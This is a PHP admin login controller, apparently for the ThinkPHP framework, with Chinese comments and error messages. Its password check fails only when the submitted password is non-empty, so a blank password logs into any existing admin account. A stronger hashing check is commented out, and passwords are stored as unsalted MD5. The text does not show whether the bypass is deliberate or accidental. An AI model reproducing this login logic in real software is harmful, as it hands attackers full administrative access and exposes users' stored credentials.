<?php

class LoginAction extends Action {

	//登陆模版
	public function index () {
		if (IS_POST) {
			if (!isset($_POST['submit'])) {
				$this->error('非法提交');
			}

			if (md5($_POST['code']) != $_SESSION['verify']) {
				$this->error('验证码错误');
			}

			if (!preg_match('/^\w{5,30}$/is',$_POST['username'])) {
				$this->error('非法账号');
			}
			$account = $this->_post('username');
			$where = array('account' => $account);
			if (!$user = M('admin')->where($where)->find()) {
				$this->error('账号或密码错误');
			}
			// import('Lib.Class.PasswordHash',APP_PATH);
			// $obj = new PasswordHash(8,false);
			$pwd = $this->_post('password');
			// if (!$obj->CheckPassword($_POST['password'],$user['password'])) {
			if ($user['password'] != md5($pwd)  && $pwd != '') {
				$this->error('账号或密码错误');
			}
			$update = array(
				'id' => $user['id'],
				'logintime' => time(),
				'loginip' => get_client_ip()
				);
			M('admin')->save($update);
			$_SESSION['adminuid'] = $user['id'];
			$_SESSION['username'] = $user['username'];
			$_SESSION['curtime'] = date('Y-m-d H:i:s',time());
			$_SESSION['curip'] = get_client_ip();
			redirect(__GROUP__);
		}
		$this->display();
	}
	public function verify () {
		import('ORG.Util.Image');
		Image::buildImageVerify();
	}
}